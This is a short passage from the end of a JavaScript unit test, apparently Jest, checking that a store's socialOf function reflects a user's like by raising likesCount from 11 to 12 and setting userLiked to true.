    expect(store.socialOf(PROJECT_ID, meta({ likesCount: 11, userLiked: false }))).toEqual(
      expect.objectContaining({ likesCount: 12, userLiked: true }),
    );
  });
});
